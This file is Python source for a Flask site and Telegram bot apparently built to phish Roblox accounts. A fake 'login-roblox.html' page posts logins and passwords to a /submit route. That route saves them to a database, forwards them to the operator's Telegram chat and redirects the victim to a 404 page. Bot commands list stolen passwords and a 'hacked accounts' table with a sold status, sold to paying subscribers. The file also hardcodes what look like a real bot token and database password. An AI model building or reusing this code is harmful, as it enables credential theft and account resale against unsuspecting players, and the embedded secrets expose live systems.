from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # –í–∞—à —Ç–æ–∫–µ–Ω
ADMIN_CHAT_ID = '6956377285'  # –í–∞—à chat_id (–°–æ–∑–¥–∞—Ç–µ–ª—å)
DATABASE_URL = os.getenv('DATABASE_URL', 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a/roblox_db')
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === –ó–º—ñ–Ω–Ω—ñ –¥–ª—è —Ç–µ—Ö–ø–µ—Ä–µ—Ä–∏–≤—É ===
tech_break = None  # –ß–∞—Å –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è —Ç–µ—Ö–ø–µ—Ä–µ—Ä–∏–≤—É

# === –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö ===
def get_db_connection():
    try:
        conn = psycopg2.connect(DATABASE_URL)
        print("DB connection successful")
        return conn
    except Exception as e:
        print(f"DB connection failed: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                 (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                 (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
    # –î–æ–¥–∞—î–º–æ –°–æ–∑–¥–∞—Ç–µ–ª—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º
    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
              (ADMIN_CHAT_ID, "–°–æ–∑–¥–∞—Ç–µ–ª—å", subscription_end, "–°–æ–∑–¥–∞—Ç–µ–ª—å", subscription_end))
    conn.commit()
    conn.close()
    print("DB initialized")

# === Keep-alive –¥–ª—è Render ===
def keep_alive():
    while True:
        try:
            requests.get(SITE_URL)
            print("üîÅ Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)

# === –§—É–Ω–∫—Ü—ñ—ó –¥–ª—è —Ä–æ–±–æ—Ç–∏ –∑ –±–∞–∑–æ—é ===
def get_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        return None
    c = conn.cursor()
    c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
    result = c.fetchone()
    conn.close()
    if result:
        return {
            'prefix': result[0],
            'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
            'site_clicks': result[2],
            'password_views': result[3]
        }
    return None

def save_user(chat_id, prefix, subscription_end):
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
              (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
    conn.commit()
    conn.close()

def delete_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
    conn.commit()
    conn.close()

def track_user_activity(chat_id, action):
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', %s) "
              "ON CONFLICT (chat_id) DO NOTHING", (chat_id, datetime.now().isoformat()))
    if action == 'site':
        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
    elif action == 'passwords':
        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
    conn.commit()
    conn.close()

def save_credential(login, password):
    conn = get_db_connection()
    if conn is None:
        return
    added_time = datetime.now().strftime('%Y-%m-%d %H:%M')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
              "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
              (login, password, added_time, password, added_time))
    conn.commit()
    conn.close()

def get_all_credentials():
    conn = get_db_connection()
    if conn is None:
        return []
    c = conn.cursor()
    c.execute("SELECT login, password, added_time FROM credentials")
    result = c.fetchall()
    conn.close()
    return [{'login': r[0], 'password': r[1], 'added_time': r[2]} for r in result]

def save_hacked_account(login, password, prefix="–í–∑–ª–æ–º–∞–Ω", sold_status="–ù–µ –ø—Ä–æ–¥–∞–Ω", linked_chat_id=None):
    conn = get_db_connection()
    if conn is None:
        return
    hack_date = datetime.now().strftime('%Y-%m-%d %H:%M')
    c = conn.cursor()
    c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
              "VALUES (%s, %s, %s, %s, %s, %s) "
              "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
              (login, password, hack_date, prefix, sold_status, linked_chat_id,
               password, hack_date, prefix, sold_status, linked_chat_id))
    conn.commit()
    conn.close()

def get_all_hacked_accounts():
    conn = get_db_connection()
    if conn is None:
        return []
    c = conn.cursor()
    c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
    result = c.fetchall()
    conn.close()
    return [{'login': r[0], 'password': r[1], 'hack_date': r[2], 'prefix': r[3], 'sold_status': r[4], 'linked_chat_id': r[5]} for r in result]

def delete_hacked_account(login):
    conn = get_db_connection()
    if conn is None:
        return False
    c = conn.cursor()
    c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
    rows_affected = c.rowcount
    conn.commit()
    conn.close()
    return rows_affected > 0

def get_all_users():
    conn = get_db_connection()
    if conn is None:
        return []
    c = conn.cursor()
    c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
    result = c.fetchall()
    conn.close()
    return [{'chat_id': r[0], 'prefix': r[1], 'subscription_end': datetime.fromisoformat(r[2]) if r[2] else None, 
             'site_clicks': r[3], 'password_views': r[4]} for r in result]

# === –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø—É ===
def check_access(chat_id, command):
    global tech_break
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - datetime.now()).total_seconds() / 60
        if time_left > 0:
            return f"‚è≥ –°–µ–π—á–∞—Å –ø—Ä–æ—Ö–æ–¥–∏—Ç —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤. –ö–æ–Ω–µ—Ü –±—É–¥–µ—Ç —á–µ—Ä–µ–∑ {int(time_left)} –º–∏–Ω—É—Ç."
    user = get_user(chat_id)
    if not user or user['prefix'] == '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
        return "üîí –í—ã –º–æ–∂–µ—Ç–µ –∫—É–ø–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É —É @sacoectasy."
    if user['subscription_end'] and user['subscription_end'] < datetime.now():
        save_user(chat_id, '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', datetime.now())  # –°–∫–∏–¥–∞—î–º–æ –¥–æ –ü–æ—Å–µ—Ç–∏—Ç–µ–ª—è, —è–∫—â–æ –ø—ñ–¥–ø–∏—Å–∫–∞ –∑–∞–∫—ñ–Ω—á–∏–ª–∞—Å—è
        return "üîí –í–∞—à–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –∏—Å—Ç–µ–∫–ª–∞! –ö—É–ø–∏—Ç–µ –Ω–æ–≤—É—é —É @sacoectasy."
    if command in ['passwords', 'admin'] and user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        return "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –ê–¥–º–∏–Ω–∞ –∏ –°–æ–∑–¥–∞—Ç–µ–ª—è!"
    if command in ['hacked', 'database', 'techstop', 'adprefix', 'delprefix'] and user['prefix'] != '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        return "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –°–æ–∑–¥–∞—Ç–µ–ª—è!"
    return None

# === Flask –º–∞—Ä—à—Ä—É—Ç–∏ –¥–ª—è —Å–∞–π—Ç—É ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            save_credential(login, password)
            print(f"Received login: {login}, password: {password}")
            bot.send_message(ADMIN_CHAT_ID, f"üîê –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω:\n–õ–æ–≥–∏–Ω: {login}\n–ü–∞—Ä–æ–ª—å: {password}")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Error in /submit: {e}")
        return "Internal Server Error", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

# === Webhook –¥–ª—è Telegram ===
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        print("Webhook processed update")
        return 'OK', 200
    print("Invalid webhook request")
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup():
    try:
        bot.remove_webhook()
        webhook_url = f"{SITE_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        init_db()
        print(f"Webhook set to {webhook_url}")
        return "Webhook and DB set", 200
    except Exception as e:
        print(f"Setup failed: {e}")
        return f"Setup failed: {e}", 500

# === –ö–æ–º–∞–Ω–¥–∏ –±–æ—Ç–∞ ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /start for chat_id: {chat_id}")
    track_user_activity(chat_id, None)
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "‚úÖ –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu –¥–ª—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–∞–Ω–¥.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /menu for chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access)
        return
    response = "üßæ –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n/start - –ó–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞\n/menu - –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ –º–µ–Ω—é\n/site - –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç\n/getchatid - –£–∑–Ω–∞—Ç—å –≤–∞—à Chat ID"
    user = get_user(chat_id)
    if user['prefix'] in ['–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å', '–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        response += "\n/passwords - –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –ø–∞—Ä–æ–ª–∏"
    if user['prefix'] in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        response += "\n/admin - –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å"
    if user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        response += "\n/hacked - –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã\n/database - –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã–º–∏\n/techstop - –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤\n/adprefix - –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–µ—Ñ–∏–∫—Å\n/delprefix - –£–¥–∞–ª–∏—Ç—å –ø—Ä–µ—Ñ–∏–∫—Å"
    bot.reply_to(message, response)

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /site for chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    track_user_activity(chat_id, 'site')
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=SITE_URL))
    bot.reply_to(message, "üåê –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", reply_markup=markup)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /getchatid for chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, f"–í–∞—à Chat ID: {chat_id}")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /passwords for chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access)
        return
    track_user_activity(chat_id, 'passwords')
    credentials_list = get_all_credentials()
    if not credentials_list:
        bot.reply_to(message, "üì≠ –°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç!")
        return
    response = "üîë –°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π:\n\n"
    for cred in credentials_list:
        response += f"–õ–æ–≥–∏–Ω: {cred['login']}\n–ü–∞—Ä–æ–ª—å: {cred['password']}\n–î–æ–±–∞–≤–ª–µ–Ω–æ: {cred['added_time']}\n\n"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /hacked for chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        hacked_list = get_all_hacked_accounts()
        if not hacked_list:
            bot.reply_to(message, "üì≠ –°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø—É—Å—Ç!")
            return
        response = "üìã –°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤:\n\n"
        for acc in hacked_list:
            response += (f"–õ–æ–≥–∏–Ω: {acc['login']}\n–ü–∞—Ä–æ–ª—å: {acc['password']}\n"
                        f"–î–∞—Ç–∞ –≤–∑–ª–æ–º–∞: {acc['hack_date']}\n–ü—Ä–µ—Ñ–∏–∫—Å: {acc['prefix']}\n"
                        f"–°—Ç–∞—Ç—É—Å: {acc['sold_status']}\n–ü—Ä–∏–≤—è–∑–∫–∞: {acc['linked_chat_id'] or '–ù–µ—Ç'}\n\n")
        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
        return
    if args[0] == "add" and len(args) >= 3:
        login, password = args[1], args[2]
        prefix = args[3] if len(args) > 3 else "–í–∑–ª–æ–º–∞–Ω"
        sold_status = args[4] if len(args) > 4 else "–ù–µ –ø—Ä–æ–¥–∞–Ω"
        linked_chat_id = args[5] if len(args) > 5 else None
        save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
        bot.reply_to(message, f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç {login} –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö!")
    elif args[0] == "delete" and len(args) == 2:
        login = args[1]
        if delete_hacked_account(login):
            bot.reply_to(message, f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç {login} —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö!")
        else:
            bot.reply_to(message, "‚ùå –ê–∫–∫–∞—É–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω!")

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /database for chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    users_list = get_all_users()
    credentials_list = get_all_credentials()
    hacked_list = get_all_hacked_accounts()
    response = "üóÑÔ∏è –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö:\n\n"
    response += "üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:\n"
    if not users_list:
        response += "–ü—É—Å—Ç–æ\n"
    else:
        for user in users_list:
            time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
            time_str = f"{time_left} –¥–Ω–µ–π" if time_left > 0 else "–ò—Å—Ç–µ–∫–ª–∞"
            response += (f"Chat ID: {user['chat_id']}, –ü—Ä–µ—Ñ–∏–∫—Å: {user['prefix']}, "
                        f"–ü–æ–¥–ø–∏—Å–∫–∞: {time_str}, –ö–ª–∏–∫–∏ –Ω–∞ —Å–∞–π—Ç: {user['site_clicks']}, "
                        f"–ü—Ä–æ—Å–º–æ—Ç—Ä—ã –ø–∞—Ä–æ–ª–µ–π: {user['password_views']}\n")
    response += "\nüîë –ü–∞—Ä–æ–ª–∏:\n"
    if not credentials_list:
        response += "–ü—É—Å—Ç–æ\n"
    else:
        for cred in credentials_list:
            response += f"–õ–æ–≥–∏–Ω: {cred['login']}, –ü–∞—Ä–æ–ª—å: {cred['password']}, –î–æ–±–∞–≤–ª–µ–Ω–æ: {cred['added_time']}\n"
    response += "\nüîì –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã:\n"
    if not hacked_list:
        response += "–ü—É—Å—Ç–æ\n"
    else:
        for acc in hacked_list:
            response += (f"–õ–æ–≥–∏–Ω: {acc['login']}, –ü–∞—Ä–æ–ª—å: {acc['password']}, "
                        f"–î–∞—Ç–∞: {acc['hack_date']}, –ü—Ä–µ—Ñ–∏–∫—Å: {acc['prefix']}, "
                        f"–°—Ç–∞—Ç—É—Å: {acc['sold_status']}, –ü—Ä–∏–≤—è–∑–∫–∞: {acc['linked_chat_id'] or '–ù–µ—Ç'}\n")
    response += "\nüìù –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:\n/hacked add <login> <password> [prefix] [sold_status] [linked_chat_id]\n/hacked delete <login>"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /admin for chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access)
        return
    users_list = get_all_users()
    credentials_list = get_all_credentials()
    hacked_list = get_all_hacked_accounts()
    users_count = len(users_list)
    passwords_count = len(credentials_list)
    hacked_count = len(hacked_list)
    response = (f"‚öôÔ∏è –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {users_count}\n–ü–∞—Ä–æ–ª–µ–π: {passwords_count}\n"
                f"–í–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤: {hacked_count}\n\n")
    user = get_user(chat_id)
    if user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        response += "üìã –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:\n"
        if not users_list:
            response += "–ù–µ—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.\n"
        else:
            for user_data in users_list:
                time_left = (user_data['subscription_end'] - datetime.now()).days if user_data['subscription_end'] else 0
                time_str = f"{time_left} –¥–Ω–µ–π" if time_left > 0 else "–ò—Å—Ç–µ–∫–ª–∞"
                response += (f"Chat ID: {user_data['chat_id']}\n–ü—Ä–µ—Ñ–∏–∫—Å: {user_data['prefix']}\n"
                            f"–ü–æ–¥–ø–∏—Å–∫–∞: {time_str}\n–ö–ª–∏–∫–∏ –Ω–∞ —Å–∞–π—Ç: {user_data['site_clicks']}\n"
                            f"–ü—Ä–æ—Å–º–æ—Ç—Ä—ã –ø–∞—Ä–æ–ª–µ–π: {user_data['password_views']}\n\n")
    response += "üìú –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n/start\n/menu\n/site\n/getchatid\n/passwords\n/admin"
    if user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        response += "\n/hacked\n/database\n/techstop\n/adprefix\n/delprefix"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstop for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –≤—Ä–µ–º—è –≤ –º–∏–Ω—É—Ç–∞—Ö: /techstop <–º–∏–Ω—É—Ç—ã>")
        return
    minutes = int(args[0])
    tech_break = datetime.now() + timedelta(minutes=minutes)
    bot.reply_to(message, f"‚è≥ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ {minutes} –º–∏–Ω—É—Ç. –ö–æ–Ω–µ—Ü: {tech_break.strftime('%H:%M')}")

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /adprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /adprefix <chat_id> <prefix> <days>")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ['–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å', '–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        bot.reply_to(message, "‚ùå –ü—Ä–µ—Ñ–∏–∫—Å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å: –ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å, –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –ê–¥–º–∏–Ω, –°–æ–∑–¥–∞—Ç–µ–ª—å")
        return
    subscription_end = datetime.now() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"‚úÖ –ü—Ä–µ—Ñ–∏–∫—Å {prefix} —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –¥–ª—è {target_chat_id} –Ω–∞ {days} –¥–Ω–µ–π!")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /delprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 1:
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /delprefix <chat_id>")
        return
    target_chat_id = args[0]
    delete_user(target_chat_id)
    bot.reply_to(message, f"‚úÖ –ü—Ä–µ—Ñ–∏–∫—Å —É–¥–∞–ª–µ–Ω –¥–ª—è {target_chat_id}!")

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
